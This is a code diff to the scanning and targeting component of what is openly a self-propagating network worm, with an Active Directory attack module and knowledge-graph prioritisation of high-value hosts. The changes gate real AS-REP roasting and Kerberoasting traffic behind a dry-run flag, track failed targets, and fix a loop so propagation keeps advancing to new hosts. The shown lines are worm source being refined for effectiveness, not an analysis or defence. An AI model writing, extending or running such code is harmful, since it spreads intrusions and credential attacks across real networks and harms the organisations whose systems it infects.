@@ -94,7 +94,9 @@ class WormCoreScanning:
                 except Exception:
                     host["host_type"] = "unknown"
 
-        if self.ad_attacker and results:
+        if self.ad_attacker and results and not self.dry_run:
+            # NOTE: gated behind dry_run -- --scan-only previously triggered
+            # real AS-REP roasting / Kerberoasting traffic against live DCs.
             try:
                 ad_report = self.ad_attacker.attack(
                     scan_results=results,
@@ -181,20 +183,29 @@ class WormCoreScanning:
             except Exception:
                 pass
 
-        self.real_world_agent.update_state(results, self.infected_hosts)
+        self.real_world_agent.update_state(results, self.infected_hosts, self.failed_targets)
         return results
 
     def select_next_target(self) -> Optional[Dict]:
         logger.info("Selecting next target")
 
-        self.real_world_agent.update_state(self.scan_results, self.infected_hosts)
+        self.real_world_agent.update_state(
+            self.scan_results, self.infected_hosts, self.failed_targets
+        )
 
         if self.knowledge_graph:
             high_value = self.knowledge_graph.get_high_value_targets()
             if high_value:
                 for hv_ip in high_value:
                     for host in self.scan_results:
-                        if host["ip"] == hv_ip and hv_ip not in self.infected_hosts:
+                        # Also exclude failed_targets: previously a failed
+                        # high-value host was re-selected forever, spinning
+                        # the propagation loop without progress.
+                        if (
+                            host["ip"] == hv_ip
+                            and hv_ip not in self.infected_hosts
+                            and hv_ip not in self.failed_targets
+                        ):
                             logger.info(f"Knowledge Graph: prioritizing high-value target {hv_ip}")
                             if self.activity_bridge:
                                 self.activity_bridge.on_ml_decision(hv_ip, 0.9)
